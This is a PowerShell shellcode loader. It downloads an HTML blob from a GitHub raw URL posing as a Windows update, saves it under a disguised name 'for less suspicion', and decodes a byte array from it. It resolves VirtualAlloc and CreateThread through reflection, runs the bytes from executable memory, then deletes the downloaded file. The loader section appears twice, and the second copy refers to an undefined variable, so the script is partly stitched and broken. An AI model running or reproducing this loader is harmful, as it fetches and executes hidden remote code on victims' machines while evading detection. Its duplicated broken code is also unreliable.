# 1. Paths and URLs
$htmlPath = "$env:TEMP\update_cache.dat" # Renamed to .dat for less suspicion
$htmlUrl = "https://raw.githubusercontent.com/gwyn1869/winupdate/main/test.html"

# 2. Download the HTML Blob
# Using -UseBasicParsing to avoid IE engine dependency
Invoke-WebRequest -Uri $htmlUrl -OutFile $htmlPath -UseBasicParsing

# 3. Extract and Reassemble the Byte Array
$htmlContent = Get-Content $htmlPath -Raw
$pattern = '(?<=dmr)(.*?)(?=dmr)'
$match = [regex]::Match($htmlContent, $pattern).Value
if (-not $match) { Write-Error "Blob not found!"; exit }

# Split by your 'dmr' delimiter and convert to actual bytes
$byteArray = $match.Split("dmr") | Where-Object { $_ -ne "" } | ForEach-Object { [byte]$_ }

# 4. The Stealth Shellcode Loader (Improved Reflection)
# We find the 'unmanaged' GetProcAddress directly from the System.Runtime namespace
$UnsafeNativeMethods = [AppDomain]::CurrentDomain.GetAssemblies() | 
    Where-Object { $_.GlobalAssemblyCache -and $_.Location.Split('\\')[-1] -eq 'System.dll' } | 
    ForEach-Object { $_.GetType('Microsoft.Win32.UnsafeNativeMethods') }

$GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [Reflection.BindingFlags]'Static, Public')
$GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle', [Reflection.BindingFlags]'Static, Public')

# Get the address of our needed functions
$hKernel32 = $GetModuleHandle.Invoke($null, @("kernel32.dll"))
$vAllocAddr = $GetProcAddress.Invoke($null, @($hKernel32, "VirtualAlloc"))
$cThreadAddr = $GetProcAddress.Invoke($null, @($hKernel32, "CreateThread"))

# Check if we actually found them before proceeding
if ($vAllocAddr -eq [IntPtr]::Zero) { Write-Error "Failed to find VirtualAlloc!"; exit }

# Create Delegate Types using the specific signatures Windows expects
$DelegateVirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($vAllocAddr, [Func[IntPtr, UInt32, UInt32, UInt32, IntPtr]])
$DelegateCreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($cThreadAddr, [Func[IntPtr, UInt32, IntPtr, IntPtr, UInt32, IntPtr, IntPtr]])

# 5. Execute
$size = [uint32]$byteArray.Length
$address = $DelegateVirtualAlloc.Invoke([IntPtr]::Zero, $size, 0x3000, 0x40)

if ($address -ne [IntPtr]::Zero) {
    [System.Runtime.InteropServices.Marshal]::Copy($byteArray, 0, $address, $size)
    $DelegateCreateThread.Invoke([IntPtr]::Zero, 0, $address, [IntPtr]::Zero, 0, [IntPtr]::Zero) | Out-Null
    Write-Host "Shellcode injected. Waiting for execution..."
    Start-Sleep -Seconds 5
}

# Get Method Handles
$GetModuleHandle = $Kernel32.GetMethod("GetModuleHandle", [Reflection.BindingFlags]"Static, Public, NonPublic")
$GetProcAddress = $Kernel32.GetMethod("GetProcAddress", [Reflection.BindingFlags]"Static, Public, NonPublic")

# Invoke Handles to get API Addresses
$hKernel32 = $GetModuleHandle.Invoke($null, @("kernel32.dll"))
$vAllocAddr = $GetProcAddress.Invoke($null, @($hKernel32, "VirtualAlloc"))
$cThreadAddr = $GetProcAddress.Invoke($null, @($hKernel32, "CreateThread"))

# Create Delegate Types (The "Magic" to call the APIs)
$DelegateVirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($vAllocAddr, [Func[IntPtr, UInt32, UInt32, UInt32, IntPtr]])
$DelegateCreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($cThreadAddr, [Func[IntPtr, UInt32, IntPtr, IntPtr, UInt32, IntPtr, IntPtr]])

# 5. Allocate, Copy, and Execute
$size = [uint32]$byteArray.Length
# Allocate Memory: 0x3000 (Commit+Reserve), 0x40 (ExecuteReadWrite)
$address = $DelegateVirtualAlloc.Invoke([IntPtr]::Zero, $size, 0x3000, 0x40)

if ($address -ne [IntPtr]::Zero) {
    # Copy Byte Array to RAM
    [System.Runtime.InteropServices.Marshal]::Copy($byteArray, 0, $address, $size)

    # Execute as a new thread
    $DelegateCreateThread.Invoke([IntPtr]::Zero, 0, $address, [IntPtr]::Zero, 0, [IntPtr]::Zero) | Out-Null
}

# 6. Cleanup
Remove-Item $htmlPath -Force
